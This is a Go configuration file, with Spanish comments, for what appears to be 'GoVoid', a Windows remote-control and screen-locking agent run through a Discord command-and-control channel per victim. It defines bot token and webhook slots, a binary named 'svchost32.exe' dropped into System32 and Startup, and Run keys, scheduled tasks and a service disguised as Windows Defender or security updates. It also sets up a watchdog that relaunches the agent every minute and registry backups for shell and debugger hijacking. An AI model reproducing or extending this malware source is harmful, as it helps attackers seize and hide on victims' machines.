// Package config guarda la identidad de la instalación. Todo lo que distingue
// una copia de otra —token, guild, webhook, nombres de objeto del kernel,
// servicio, tareas, claves de registro y carpetas— sale de aquí.
//
// Los valores marcados como sobrescribibles se fijan en tiempo de enlace, sin
// tocar el código:
//
//	go build -ldflags "\
//	  -X github.com/local/govoid/internal/config.BotToken=... \
//	  -X github.com/local/govoid/internal/config.GuildID=..." ./cmd/agent
//
// Solo funciona sobre variables inicializadas con una cadena constante: el
// enlazador parchea el dato, y los nombres derivados de más abajo se calculan
// después, al arrancar, a partir del valor ya parcheado.
package config

import (
	"os"
	"path/filepath"
)

// --- por cliente: los cambia el script de compilación ---

var (
	// ProductID es el token corto que va en mutex, servicio, tareas, claves de
	// registro y carpetas. Sin espacios ni símbolos: acaba siendo nombre de
	// objeto del kernel.
	ProductID = "GoVoid"

	// AppName aparece en el panel, en los webhooks y en el nombre del servicio.
	AppName = "GoVoid"

	// BotToken es el token de la aplicación de Discord que atiende esta copia.
	// Vacío en el código: se inyecta al compilar con -ldflags -X, o lo escribe
	// el operador en GoVoid Studio. Un binario sin credenciales no arranca.
	BotToken = ""

	// GuildID es la guild donde vive el canal C2 de cada víctima.
	GuildID = ""

	// WebhookURL recibe los avisos de conexión, caída y apagado.
	WebhookURL = ""

	// CategoryID es opcional. Vacío = canal sin categoría.
	CategoryID = ""

	// ChannelPrefix marca los canales de sesión en la guild.
	ChannelPrefix = "sesion-"

	// BinaryName es el nombre con el que se instala en APPDATA, System32 y
	// Startup. Dos clientes en la misma máquina necesitan nombres distintos o
	// se sobrescriben el ejecutable.
	BinaryName = "svchost32.exe"

	// RunKeyName es el nombre del valor en las claves Run.
	RunKeyName = "WindowsSecurityUpdate"

	// TaskLogonName y TaskBootName son las dos tareas de persistencia.
	TaskLogonName = "WindowsDefenderUpdate"
	TaskBootName  = "WindowsDefenderUpdateBoot"

	// ServiceDisplayName es lo que ve el operador en services.msc.
	ServiceDisplayName = "Windows Security Shield"
)

// --- derivados: no se tocan a mano ---

// Los inicializadores de paquete se ejecutan en orden de dependencia, así que
// estos ven el ProductID ya parcheado por el enlazador. Cambiar ProductID
// renombra de golpe todos los objetos de la máquina y no deja huérfanos.
var (
	// MutexName protege la instancia única del agente.
	MutexName = `Local\` + ProductID + `AgentSingleInstance`

	// GuardMutexFmt da un mutex por centinela. Es la señal de vida: si el
	// objeto no existe, su dueño murió.
	GuardMutexFmt = `Local\` + ProductID + `LockGuard%d`

	// WindowClassPrefix es la clase de ventana de la cortina.
	WindowClassPrefix = ProductID + `LockScreen`

	// ServiceName y ServiceTaskName son las dos capas que corren fuera del
	// proceso del agente.
	ServiceName     = ProductID + `Shield`
	ServiceTaskName = ProductID + `ShieldGuard`

	// TaskWatchdogName relanza el agente cada minuto. Si el proceso muere por
	// un panic o lo mata un tercero, vuelve solo sin esperar a un logon.
	TaskWatchdogName = ProductID + `Watchdog`

	// DataDirName es la carpeta machine-wide bajo %ProgramData%.
	DataDirName = ProductID

	// Nombres de respaldo en el registro. Llevan el producto para que dos
	// instalaciones distintas no se pisen los valores al desinstalarse.
	ShellBackupValue    = ProductID + `ShellBackup`
	DebuggerBackupValue = ProductID + `DebuggerBackup`
	PolicyBackupPrefix  = ProductID + `Backup`
	PolicyMarkerPrefix  = ProductID + `Had`
)

// StateDir devuelve la carpeta de estado del agente, machine-wide.
//
// El identificador de instancia y la caché de canal vivían en %APPDATA%\GoVoid.
// Eso vale mientras el agente lo arranque el usuario, pero la tarea SYSTEM lo
// lanza con el perfil de SYSTEM: %APPDATA% apunta a systemprofile, el agente se
// inventa otro identificador y acaba en otra sesión. El operador ve "conectado"
// pero sin panel y sin canal. ProgramData es el mismo para las dos rutas.
func StateDir() string {
	if programData := os.Getenv("ProgramData"); programData != "" {
		return filepath.Join(programData, DataDirName)
	}
	if dir, err := os.UserConfigDir(); err == nil && dir != "" {
		return filepath.Join(dir, DataDirName)
	}
	return filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", DataDirName)
}
